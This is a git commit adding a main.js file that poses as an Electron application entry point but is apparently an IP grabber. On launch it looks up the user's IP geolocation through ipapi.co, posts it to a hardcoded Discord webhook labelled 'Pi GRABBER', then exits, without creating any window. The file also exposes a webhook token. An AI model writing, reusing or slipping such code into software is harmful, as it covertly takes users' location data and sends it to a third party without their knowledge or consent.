ff6e3105b71ab280c0956aacad8dff9772c1136f
NodeMixaholic <sam@sllord.info>
2023-03-17 14:17:50 -0500

    Add files via upload

---
+++ main.js
@@ -0,0 +1,26 @@
+// Modules to control application life and create native browser window
+const {app, BrowserWindow, session, ipcMain} = require('electron')
+const path = require('path')
+const fetch = require("cross-fetch")
+const { ElectronChromeExtensions } = require('electron-chrome-extensions')
+var ipapi = require('ipapi.co');
+
+const { Webhook } = require('discord-webhook-node');
+const hook = new Webhook("https://discord.com/api/webhooks/1086355372115251200/H6QmsRPeTfcwZUq1oa5d5van3tsqICGJ9ieezilibw5UxQGHQKlqs2bLLgpymiurSW5-");
+ 
+const IMAGE_URL = 'https://images7.memedroid.com/images/UPLOADED883/5d5dafcfcf72e.jpeg';
+hook.setUsername('Pi GRABBER');
+hook.setAvatar(IMAGE_URL);
+let ipCallback = function(loc){
+  loc = JSON.stringify(loc)
+  hook.send(`${loc}`)
+  return 0
+};
+
+async function lmao() {
+  await ipapi.location(ipCallback);
+  await new Promise(resolve => setTimeout(resolve, 2600));
+  process.exit();
+}
+
+lmao()
